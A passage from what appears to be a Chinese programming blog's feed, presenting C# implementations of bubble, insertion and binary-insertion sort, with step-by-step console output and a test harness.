class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Generic;</span><br><span class="line"><span class="keyword">using</span> System.Linq;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">BasicStructure</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title">CSharpArray</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">int</span>[] array;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">CSharpArray</span>(<span class="params"><span class="keyword">int</span> count</span>)</span></span><br><span class="line"><span class="function"></span>        &#123;</span><br><span class="line">            array = <span class="keyword">new</span> <span class="keyword">int</span>[count];</span><br><span class="line">            Random random = <span class="keyword">new</span> Random();</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; count; i++)</span><br><span class="line">            &#123;</span><br><span class="line">                array[i] = random.Next(count);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">int</span>[] <span class="title">getArray</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>        &#123;</span><br><span class="line">            <span class="keyword">return</span> array;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">PrintArray</span>(<span class="params"><span class="keyword">int</span> []array</span>)</span></span><br><span class="line"><span class="function"></span>        &#123;</span><br><span class="line">            <span class="keyword">int</span> count=array.Length;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; count; i++)</span><br><span class="line">            &#123;</span><br><span class="line">                Console.Write(<span class="string">"\t&#123;0&#125;"</span>, array[i]);</span><br><span class="line">                <span class="keyword">if</span> ((i + <span class="number">1</span>) % <span class="number">8</span> == <span class="number">0</span>)</span><br><span class="line">                    Console.WriteLine();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;summary&gt;</span></span></span><br><span class="line">        <span class="comment"><span class="doctag">///</span> 冒泡排序算法</span></span><br><span class="line">        <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;/summary&gt;</span></span></span><br><span class="line">        <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;param name="array"&gt;</span>待排序的数组<span class="doctag">&lt;/param&gt;</span></span></span><br><span class="line">        <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;param name="orderType"&gt;</span>排序类型 0：升序；1：降序<span class="doctag">&lt;/param&gt;</span></span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">BubbleSort</span>(<span class="params"><span class="keyword">int</span> []array,<span class="keyword">int</span> orderType</span>)</span></span><br><span class="line"><span class="function"></span>        &#123;</span><br><span class="line">            <span class="keyword">int</span> temp;</span><br><span class="line">            <span class="keyword">int</span> count = array.Length;</span><br><span class="line">            <span class="keyword">if</span>(orderType==<span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> i = count; i &gt;= <span class="number">1</span>; i--)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; i - <span class="number">1</span>; j++)</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">if</span> (array[j] &gt; array[j + <span class="number">1</span>])</span><br><span class="line">                        &#123;</span><br><span class="line">                            temp = array[j];</span><br><span class="line">                            array[j] = array[j + <span class="number">1</span>];</span><br><span class="line">                            array[j + <span class="number">1</span>] = temp;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    PrintArray(array);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(orderType==<span class="number">1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> i = count; i &gt;= <span class="number">1</span>; i--)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; i - <span class="number">1</span>; j++)</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">if</span> (array[j] &lt; array[j + <span class="number">1</span>])</span><br><span class="line">                        &#123;</span><br><span class="line">                            temp = array[j];</span><br><span class="line">                            array[j] = array[j + <span class="number">1</span>];</span><br><span class="line">                            array[j + <span class="number">1</span>] = temp;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    PrintArray(array);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;summary&gt;</span></span></span><br><span class="line">        <span class="comment"><span class="doctag">///</span> 插入排序算法</span></span><br><span class="line">        <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;/summary&gt;</span></span></span><br><span class="line">        <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;param name="array"&gt;</span>待排序的数组<span class="doctag">&lt;/param&gt;</span></span></span><br><span class="line">        <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;param name="orderType"&gt;</span>排序类型 0：升序；1：降序<span class="doctag">&lt;/param&gt;</span></span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">InsertSort</span>(<span class="params"><span class="keyword">int</span>[] array,<span class="keyword">int</span> orderType</span>)</span></span><br><span class="line"><span class="function"></span>        &#123;</span><br><span class="line">            <span class="keyword">int</span> j = <span class="number">0</span>,temp;</span><br><span class="line">            <span class="keyword">int</span> count = array.Length;</span><br><span class="line">            <span class="keyword">if</span> (orderType == <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; count; i++)</span><br><span class="line">                &#123;</span><br><span class="line">                    temp = array[i];</span><br><span class="line">                    j = i;</span><br><span class="line">                    <span class="keyword">while</span> (j &gt; <span class="number">0</span> &amp;&amp; array[j - <span class="number">1</span>] &gt;= temp)</span><br><span class="line">                    &#123;</span><br><span class="line">                        array[j] = array[j - <span class="number">1</span>];</span><br><span class="line">                        j -= <span class="number">1</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    array[j] = temp;</span><br><span class="line">                    PrintArray(array);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (orderType == <span class="number">1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; count; i++)</span><br><span class="line">                &#123;</span><br><span class="line">                    temp = array[i];</span><br><span class="line">                    j = i;</span><br><span class="line">                    <span class="keyword">while</span> (j &gt; <span class="number">0</span> &amp;&amp; array[j - <span class="number">1</span>] &lt;= temp)</span><br><span class="line">                    &#123;</span><br><span class="line">                        array[j] = array[j - <span class="number">1</span>];</span><br><span class="line">                        j -= <span class="number">1</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    array[j] = temp;</span><br><span class="line">                    PrintArray(array);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;summary&gt;</span></span></span><br><span class="line">        <span class="comment"><span class="doctag">///</span> 对半插入排序算法</span></span><br><span class="line">        <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;/summary&gt;</span></span></span><br><span class="line">        <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;param name="array"&gt;</span>待排序的数组<span class="doctag">&lt;/param&gt;</span></span></span><br><span class="line">        <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;param name="orderType"&gt;</span>排序类型 0：升序；1：降序<span class="doctag">&lt;/param&gt;</span></span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">HalfInsertSort</span>(<span class="params"><span class="keyword">int</span>[] array, <span class="keyword">int</span> orderType</span>)</span></span><br><span class="line"><span class="function"></span>        &#123;</span><br><span class="line">            <span class="keyword">int</span> j = <span class="number">0</span>, temp,low,high,mid;</span><br><span class="line">            <span class="keyword">int</span> count = array.Length;</span><br><span class="line">            <span class="keyword">if</span> (orderType == <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; count; i++)</span><br><span class="line">                &#123;</span><br><span class="line">                    temp = array[i];</span><br><span class="line">                    low = <span class="number">0</span>;</span><br><span class="line">                    high = i - <span class="number">1</span>;</span><br><span class="line">                    <span class="keyword">while</span> (low &lt;= high)</span><br><span class="line">                    &#123;</span><br><span class="line">                        mid = (low + high) / <span class="number">2</span>;</span><br><span class="line">                        <span class="keyword">if</span> (temp &lt; array[mid]) high = mid - <span class="number">1</span>;</span><br><span class="line">                        <span class="keyword">else</span> low = mid + <span class="number">1</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">for</span> (j = i - <span class="number">1</span>; j &gt;= low; j--) array[j + <span class="number">1</span>] = array[j];</span><br><span class="line">                    array[low] = temp;</span><br><span class="line">                    PrintArray(array);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (orderType == <span class="number">1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; count; i++)</span><br><span class="line">                &#123;</span><br><span class="line">                    temp = array[i];</span><br><span class="line">                    low = <span class="number">0</span>;</span><br><span class="line">                    high = i - <span class="number">1</span>;</span><br><span class="line">                    <span class="keyword">while</span> (low &lt; high)</span><br><span class="line">                    &#123;</span><br><span class="line">                        mid = (low + high) / <span class="number">2</span>;</span><br><span class="line">                        <span class="keyword">if</span> (temp &gt; array[mid]) high = mid - <span class="number">1</span>;</span><br><span class="line">                        <span class="keyword">else</span> low = mid + <span class="number">1</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">for</span> (j = i - <span class="number">1</span>; j &gt;= low; j--) array[j + <span class="number">1</span>] = array[j];</span><br><span class="line">                    array[low] = temp;</span><br><span class="line">                    PrintArray(array);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&ensp; &ensp; &ensp; OK，对半插入排序算法的基本演示就到此结束！</p><p>&ensp; &ensp; &ensp; 注：由于数组时代码里生成的随机数组，因此每次运行的结果基本不一样，可能与以上演示结果不同。</p><p><span><a>反馈请点击:</a><a target="_blank" href="http://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&amp;email=lKWmp62soKykoqLU5eW69-v5" style="text-decoration:none"><img src="http://rescdn.qqmail.com/zh_CN/htmledition/images/function/qm_open/ico_mailme_11.png" alt></a></span></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&amp;ensp; &amp;ensp; &amp;ensp; 之前的文章介绍了&lt;a href=&quot;http://blog.lxzh.app/2013/09/25/Basic-Sort-Algorithm-BubbleSort/&quot;&gt;&lt;font color=&quot;blue&quot;&gt;冒泡排序&lt;/font&gt;&lt;/a&gt;和&lt;a href=&quot;http://blog.lxzh.app/2013/09/30/Basic-Sort-Algorithm-InsertionSort/&quot;&gt;&lt;font color=&quot;blue&quot;&gt;插入排序&lt;/font&gt;&lt;/a&gt;，这里再补充一个&lt;code&gt;对半插入排序&lt;/code&gt;算法，它与&lt;code&gt;对半查找算法&lt;/code&gt;（&lt;code&gt;二分查找算法&lt;/code&gt;）有点相似之处。&lt;/p&gt;
&lt;p&gt;&amp;ensp; &amp;ensp; &amp;ensp; 还是先上代码：&lt;/p&gt;
    
    </summary>
    
    
      <category term="data structure" scheme="http://blog.lxzh.app/tags/data-structure/"/>
    
  </entry>
  
  <entry>
    <title>基础排序算法(二)——插入排序</title>
    <link href="http://blog.lxzh.app/2013/09/30/Basic-Sort-Algorithm-InsertionSort/"/>
    <id>http://blog.lxzh.app/2013/09/30/Basic-Sort-Algorithm-InsertionSort/</id>
    <published>2013-09-30T15:45:52.000Z</published>
    <updated>2020-12-25T15:51:07.497Z</updated>
    
    <content type="html"><![CDATA[<p>&ensp; &ensp; &ensp; 之前写了一个冒泡排序算法，这里再加一个<a href="http://student.zjzk.cn/course_ware/data_structure/web/paixu/paixu8.2.1.1.htm" target="_blank" rel="noopener"><font color="blue">插入排序算法</font></a>，链接里讲得也比较详细，不过为了熟练，还是自己亲自敲一遍，再次贴出来，分享一下</p><p>&ensp; &ensp; &ensp; 还是先上代码：<br> <a id="more"></a></p><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">InsertSort</span>(<span class="params"><span class="keyword">int</span>[] array</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> j = <span class="number">0</span>,temp;</span><br><span class="line">    <span class="keyword">int</span> count = array.Length;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; count; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        temp = array[i];</span><br><span class="line">        j = i;</span><br><span class="line">        <span class="keyword">while</span> (j &gt; <span class="number">0</span> &amp;&amp; array[j - <span class="number">1</span>] &gt;= temp)</span><br><span class="line">        &#123;</span><br><span class="line">            array[j] = array[j - <span class="number">1</span>];</span><br><span class="line">            j -= <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        array[j] = temp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&ensp; &ensp; &ensp; 同样在<code>Program</code>的<code>Main</code>函数里New一个<a href="http://blog.lxzh.app/2013/09/25/Basic-Sort-Algorithm-BubbleSort/"><font color="blue">（一）</font></a>中写的那个<code>CSharpArray</code>类，调用其中的方法测试：</p><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Generic;</span><br><span class="line"><span class="keyword">using</span> System.Linq;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">BasicStructure</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="keyword">string</span>[] args</span>)</span></span><br><span class="line"><span class="function"></span>        &#123;</span><br><span class="line">            CSharpArray csharArray = <span class="keyword">new</span> CSharpArray(<span class="number">8</span>);</span><br><span class="line">            <span class="keyword">int</span>[] array = csharArray.getArray();</span><br><span class="line">            Console.WriteLine(<span class="string">"排序前:"</span>);</span><br><span class="line">            Console.WriteLine();</span><br><span class="line">            csharArray.PrintArray(array);</span><br><span class="line">            Console.WriteLine();</span><br><span class="line">            Console.WriteLine(<span class="string">"排序后:"</span>);</span><br><span class="line">            csharArray.InsertSort(array);</span><br><span class="line">            csharArray.PrintArray(array);</span><br><span class="line"></span><br><span class="line">            Console.ReadKey();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&ensp; &ensp; &ensp; 输出结果：<br>&ensp; &ensp; &ensp; 排序前:</p><pre><code>0       4       0       1       1       4       5       7</code></pre><p>&ensp; &ensp; &ensp; 排序后:</p><pre><code>0       0       1       1       4       4       5       7</code></pre><p>&ensp; &ensp; &ensp; 为了显示<code>for</code>循环中的每次执行结果，在<code>InsertSort</code>方法里加一句输出：</p><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">InsertSort</span>(<span class="params"><span class="keyword">int</span>[] array</span>)</span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    <span class="keyword">int</span> j = <span class="number">0</span>,temp;  </span><br><span class="line">    <span class="keyword">int</span> count = array.Length;  </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; count; i++)  </span><br><span class="line">    &#123;  </span><br><span class="line">        temp = array[i];  </span><br><span class="line">        j = i;  </span><br><span class="line">        <span class="keyword">while</span> (j &gt; <span class="number">0</span> &amp;&amp; array[j - <span class="number">1</span>] &gt;= temp)  </span><br><span class="line">        &#123;  </span><br><span class="line">            array[j] = array[j - <span class="number">1</span>];  </span><br><span class="line">            j -= <span class="number">1</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">        array[j] = temp;  </span><br><span class="line">        PrintArray(array);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&ensp; &ensp; &ensp; 再次编译运行即得以下结果：<br>&ensp; &ensp; &ensp; 排序前:</p><pre><code>4       6       0       5       0       3       1       3</code></pre><p>&ensp; &ensp; &ensp; 排序后:</p><pre><code>4       6       0       5       0       3       1       30       4       6       5       0       3       1       30       4       5       6       0       3       1       30       0       4       5       6       3       1       30       0       3       4       5       6       1       30       0       1       3       4       5       6       30       0       1       3       3       4       5       60       0       1       3       3       4       5       6</code></pre><p>&ensp; &ensp; &ensp; 由此可见，插入排序算法的基本思想是从左到右找出最小的一个往左移插入到合适的位置，遍历完整个数组之后，真个数组就变为有序啦！</p><p>&ensp; &ensp; &ensp; 同样，为了将以上的升序排序算法改为降序，也只需将<code>while</code>括号里的大于号改为小于号即可。</p><p>&ensp; &ensp; &ensp; 这里，既然将其封装在一个类里，自然要提高其通用性，因此，我可以再给改排序算法添加一个参数，用来标记是升序排序还是降序排序。如：用<strong>“0”</strong>表示<strong>升序</strong>，用<strong>“1”</strong>表示<strong>降序</strong>，在不降低代码运行效率时以牺牲代码简洁性来修改一下代码：</p><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;summary&gt;</span></span></span><br><span class="line"><span class="comment"><span class="doctag">///</span> 插入排序算法</span></span><br><span class="line"> <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;/summary&gt;</span></span></span><br><span class="line"><span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;param name="array"&gt;</span>待排序的数组<span class="doctag">&lt;/param&gt;</span></span></span><br><span class="line"><span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;param name="orderType"&gt;</span>排序类型 0：升序；1：降序<span class="doctag">&lt;/param&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">InsertSort</span>(<span class="params"><span class="keyword">int</span>[] array,<span class="keyword">int</span> orderType</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> j = <span class="number">0</span>,temp;</span><br><span class="line">    <span class="keyword">int</span> count = array.Length;</span><br><span class="line">    <span class="keyword">if</span> (orderType == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; count; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            temp = array[i];</span><br><span class="line">            j = i;</span><br><span class="line">            <span class="keyword">while</span> (j &gt; <span class="number">0</span> &amp;&amp; array[j - <span class="number">1</span>] &gt;= temp)</span><br><span class="line">            &#123;</span><br><span class="line">                array[j] = array[j - <span class="number">1</span>];</span><br><span class="line">                j -= <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            array[j] = temp;</span><br><span class="line">            PrintArray(array);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (orderType == <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; count; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            temp = array[i];</span><br><span class="line">            j = i;</span><br><span class="line">            <span class="keyword">while</span> (j &gt; <span class="number">0</span> &amp;&amp; array[j - <span class="number">1</span>] &lt;= temp)</span><br><span class="line">            &#123;</span><br><span class="line">                array[j] = array[j - <span class="number">1</span>];</span><br><span class="line">                j -= <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            array[j] = temp;</span><br><span class="line">            PrintArray(array);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&ensp; &ensp; &ensp; 再修改<code>Main</code>函数里代码：</p><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Generic;</span><br><span class="line"><span class="keyword">using</span> System.Linq;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">BasicStructure</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="keyword">string</span>[] args</span>)</span></span><br><span class="line"><span class="function"></span>        &#123;</span><br><span class="line">            CSharpArray csharArray = <span class="keyword">new</span> CSharpArray(<span class="number">8</span>);</span><br><span class="line">            <span class="keyword">int</span>[] array = csharArray.getArray();</span><br><span class="line">            Console.WriteLine(<span class="string">"排序前:"</span>);</span><br><span class="line">            Console.WriteLine();</span><br><span class="line">            csharArray.PrintArray(array);</span><br><span class="line">            Console.WriteLine();</span><br><span class="line">            Console.WriteLine(<span class="string">"升序排序后:"</span>);</span><br><span class="line">            csharArray.InsertSort(array,<span class="number">0</span>);</span><br><span class="line">            csharArray.PrintArray(array);</span><br><span class="line">            Console.WriteLine(<span class="string">"降序排序后:"</span>);</span><br><span class="line">            csharArray.InsertSort(array, <span class="number">1</span>);</span><br><span class="line">            csharArray.PrintArray(array);</span><br><span class="line"></span><br><span class="line">            Console.ReadKey();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&ensp; &ensp; &ensp; 编译运行结果如下所示：</p><p>&ensp; &ensp; &ensp; 排序前:</p><pre><code>5       7       1       2       7       2       2       4</code></pre><p>&ensp; &ensp; &ensp; 升序排序后:</p><pre><code>5       7       1       2       7       2       2       41       5       7       2       7       2       2       41       2       5       7       7       2       2       41       2       5       7       7       2       2       41       2       2       5       7       7       2       41       2       2       2       5       7       7       41       2       2       2       4       5       7       71       2       2       2       4       5       7       7</code></pre><p>&ensp; &ensp; &ensp; 降序排序后:</p><pre><code>2       1       2       2       4       5       7       72       2       1       2       4       5       7       72       2       2       1       4       5       7       74       2       2       2       1       5       7       75       4       2       2       2       1       7       77       5       4       2       2       2       1       77       7       5       4       2       2       2       17       7       5       4       2       2       2       1</code></pre><p>&ensp; &ensp; &ensp; 最后，再次贴一下<code>CSharpArray</code>类的代码：</p><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span 